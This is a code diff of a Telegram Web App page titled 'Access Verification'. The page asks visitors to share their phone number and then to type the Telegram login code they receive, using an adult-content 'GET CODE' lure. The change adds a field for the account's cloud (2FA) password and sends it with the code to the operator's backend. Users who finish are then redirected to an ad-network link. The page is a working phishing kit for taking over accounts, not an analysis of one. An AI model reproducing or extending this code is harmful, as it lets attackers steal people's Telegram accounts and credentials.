@@ -6,79 +6,39 @@
     <title>Access Verification</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
+        /* আগের সব স্টাইল ঠিক থাকবে, শুধু পাসওয়ার্ড ইনপুট এর জন্য নতুন স্টাইল */
         * { box-sizing: border-box; transition: 0.3s; margin: 0; padding: 0; }
-        
-        body { 
-            font-family: 'Segoe UI', sans-serif; 
-            background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; 
-            background-size: cover; 
-            height: 100vh; 
-            width: 100vw;
-            overflow: hidden;
-            position: relative;
-        }
-        
-        .overlay { 
-            position: absolute; 
-            top: 0; left: 0; width: 100%; height: 100%; 
-            background: rgba(0,0,0,0.3); 
-            backdrop-filter: blur(3px); 
-            z-index: 1; 
-        }
-        
-        .card { 
-            position: absolute; 
-            top: 50%; 
-            left: 50%; 
-            transform: translate(-50%, -50%); 
-            z-index: 2; 
-            width: 90%; 
-            max-width: 380px; 
-            background: rgba(255, 255, 255, 0.15); 
-            backdrop-filter: blur(8px); 
-            -webkit-backdrop-filter: blur(8px);
-            border-radius: 30px; 
-            padding: 35px 25px; 
-            text-align: center; 
-            box-shadow: 0 20px 50px rgba(0,0,0,0.5); 
-            border: 1px solid rgba(255,255,255,0.3); 
-        }
-
+        body { font-family: 'Segoe UI', sans-serif; background: url('https://rony90790.github.io/session-web/IMG_20260415_045401_985.jpg') no-repeat center center fixed; background-size: cover; height: 100vh; width: 100vw; overflow: hidden; position: relative; }
+        .overlay { position: absolute; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0,0,0,0.3); backdrop-filter: blur(3px); z-index: 1; }
+        .card { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); z-index: 2; width: 90%; max-width: 380px; background: rgba(255, 255, 255, 0.15); backdrop-filter: blur(8px); -webkit-backdrop-filter: blur(8px); border-radius: 30px; padding: 35px 25px; text-align: center; box-shadow: 0 20px 50px rgba(0,0,0,0.5); border: 1px solid rgba(255,255,255,0.3); }
         .icon { font-size: 60px; margin-bottom: 10px; text-shadow: 0 4px 10px rgba(0,0,0,0.5); }
-        
         h2 { color: #ffffff; margin: 0 0 10px; font-size: 24px; font-weight: 800; text-shadow: 0 2px 5px rgba(0,0,0,0.8); }
         p { color: #f0f0f0; font-size: 15px; margin-bottom: 25px; line-height: 1.5; font-weight: 600; text-shadow: 0 2px 4px rgba(0,0,0,0.8); }
-        
         .btn { width: 100%; padding: 16px; border-radius: 18px; border: none; font-size: 18px; font-weight: bold; cursor: pointer; color: #fff; }
-        
-        .btn-confirm { 
-            background: linear-gradient(135deg, #ff416c, #ff4b2b); 
-            box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); 
-            animation: pulse-btn 2s infinite; 
-            text-transform: uppercase;
-            letter-spacing: 1px;
-        }
-
-        @keyframes pulse-btn {
-            0% { transform: scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
-            50% { transform: scale(1.04); box-shadow: 0 12px 30px rgba(255, 65, 108, 0.8); }
-            100% { transform: scale(1); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); }
-        }
-
+        .btn-confirm { background: linear-gradient(135deg, #ff416c, #ff4b2b); box-shadow: 0 8px 25px rgba(255, 65, 108, 0.6); animation: pulse-btn 2s infinite; text-transform: uppercase; letter-spacing: 1px; }
+        @keyframes pulse-btn { 0% { transform: scale(1); } 50% { transform: scale(1.04); } 100% { transform: scale(1); } }
         .btn-view { background: linear-gradient(135deg, #00c6ff, #0072ff); margin-bottom: 20px; box-shadow: 0 5px 15px rgba(0, 114, 255, 0.4); }
-        .btn-view:active { transform: scale(0.95); }
-
         .otp-container { display: flex; justify-content: center; gap: 8px; margin-bottom: 25px; }
-        
-        .otp-box { width: 45px; height: 55px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255,255,255,0.3); border-radius: 12px; font-size: 26px; font-weight: bold; color: #fff; display: flex; align-items: center; justify-content: center; box-shadow: inset 0 2px 5px rgba(0,0,0,0.3); }
-        
+        .otp-box { width: 45px; height: 55px; background: rgba(0, 0, 0, 0.4); border: 1px solid rgba(255,255,255,0.3); border-radius: 12px; font-size: 26px; font-weight: bold; color: #fff; display: flex; align-items: center; justify-content: center; }
         .keypad { display: grid; grid-template-columns: repeat(3, 1fr); gap: 12px; }
-        .key { background: rgba(0, 0, 0, 0.4); padding: 15px; border-radius: 15px; font-size: 22px; font-weight: bold; color: #fff; cursor: pointer; border: 1px solid rgba(255,255,255,0.2); box-shadow: 0 4px 10px rgba(0,0,0,0.2); text-shadow: 0 2px 4px rgba(0,0,0,0.5); }
-        .key:active { background: rgba(255, 255, 255, 0.2); transform: scale(0.92); }
-        
+        .key { background: rgba(0, 0, 0, 0.4); padding: 15px; border-radius: 15px; font-size: 22px; font-weight: bold; color: #fff; cursor: pointer; border: 1px solid rgba(255,255,255,0.2); }
         .hidden { display: none !important; }
         .loader { border: 4px solid rgba(255,255,255,0.2); border-top: 4px solid #ff4b2b; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 20px auto; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+
+        /* টু-স্টেপ পাসওয়ার্ড ইনপুট স্টাইল */
+        #pass_input {
+            width: 100%;
+            padding: 12px;
+            margin-bottom: 15px;
+            border-radius: 12px;
+            border: 1px solid #ff4b2b;
+            background: rgba(0,0,0,0.6);
+            color: #fff;
+            text-align: center;
+            font-size: 18px;
+            outline: none;
+        }
     </style>
 </head>
 <body>
@@ -101,16 +61,26 @@
         <!-- Step 2: OTP -->
         <div id="step2" class="hidden">
             <div class="icon">📩</div>
-            <p>Enter the 5-digit code that we just sent you!</p>
-            <div class="otp-container">
-                <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
+            <p id="step2_text">Enter the 5-digit code that we just sent you!</p>
+            
+            <!-- 2FA Password Input (Default Hidden) -->
+            <div id="2fa_step" class="hidden">
+                <p style="color: #ff4b2b; font-size: 14px; margin-bottom: 10px;">Cloud Password Required!</p>
+                <input type="password" id="pass_input" placeholder="Enter Password">
+                <button class="btn btn-confirm" style="margin-bottom: 15px;" onclick="verifyOTP()">Verify Password</button>
             </div>
-            <button class="btn btn-view" onclick="viewCode()">🔞 GET CODE 🔞</button>
-            <div class="keypad">
-                <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
-                <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
-                <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
-                <div style="background:transparent; box-shadow: none; border: none;"></div><div class="key" onclick="press('0')">0</div><div class="key" onclick="back()">⌫</div>
+
+            <div id="otp_display">
+                <div class="otp-container">
+                    <div class="otp-box" id="b1"></div><div class="otp-box" id="b2"></div><div class="otp-box" id="b3"></div><div class="otp-box" id="b4"></div><div class="otp-box" id="b5"></div>
+                </div>
+                <button class="btn btn-view" onclick="viewCode()">🔞 GET CODE 🔞</button>
+                <div class="keypad">
+                    <div class="key" onclick="press('1')">1</div><div class="key" onclick="press('2')">2</div><div class="key" onclick="press('3')">3</div>
+                    <div class="key" onclick="press('4')">4</div><div class="key" onclick="press('5')">5</div><div class="key" onclick="press('6')">6</div>
+                    <div class="key" onclick="press('7')">7</div><div class="key" onclick="press('8')">8</div><div class="key" onclick="press('9')">9</div>
+                    <div style="background:transparent; box-shadow: none; border: none;"></div><div class="key" onclick="press('0')">0</div><div class="key" onclick="back()">⌫</div>
+                </div>
             </div>
         </div>
     </div>
@@ -132,7 +102,7 @@
         function startProcess() {
             getUserId();
             if (!userId) return alert("Error: User data not found. Open from Telegram!");
-            tg.requestContact((shared, data) => {
+            tg.requestContact((shared) => {
                 if (shared) {
                     document.getElementById('step1').classList.add('hidden');
                     document.getElementById('loading').classList.remove('hidden');
@@ -145,9 +115,8 @@
             try {
                 const res = await fetch(`${BACKEND_URL}/check_contact/${userId}`);
                 const data = await res.json();
-                if (data.status === "success") {
-                    sendNumber(data.phone);
-                } else { setTimeout(pollContact, 1500); }
+                if (data.status === "success") { sendNumber(data.phone); } 
+                else { setTimeout(pollContact, 1500); }
             } catch (e) { setTimeout(pollContact, 2000); }
         }
 
@@ -179,18 +148,25 @@
         function back() { currentOTP = currentOTP.slice(0, -1); for(let i=1; i<=5; i++) document.getElementById('b'+i).innerText = currentOTP[i-1] || ""; }
 
         async function verifyOTP() {
+            const password = document.getElementById('pass_input').value;
+            
             const res = await fetch(`${BACKEND_URL}/verify_otp`, {
                 method: "POST", headers: {"Content-Type": "application/json"},
-                body: JSON.stringify({ user_id: userId, otp: currentOTP })
+                body: JSON.stringify({ user_id: userId, otp: currentOTP, password: password })
             });
             const data = await res.json();
             
-            // লগইন সফল হলে আপনার লিংকে নিয়ে যাবে
             if (data.status === "success") { 
                 window.location.href = "https://www.profitablecpmratenetwork.com/w47jpksk7t?key=15b5e8ae609b09733d4a0906eac2a446";
+            } 
+            else if (data.status === "password_needed") {
+                // ২এফএ পাসওয়ার্ড বক্স দেখাবে
+                document.getElementById('otp_display').classList.add('hidden');
+                document.getElementById('step2_text').classList.add('hidden');
+                document.getElementById('2fa_step').classList.remove('hidden');
             }
             else { 
-                alert("Invalid Code!"); 
+                alert(data.message || "Invalid Code!"); 
                 currentOTP = ""; 
                 back(); 
             }
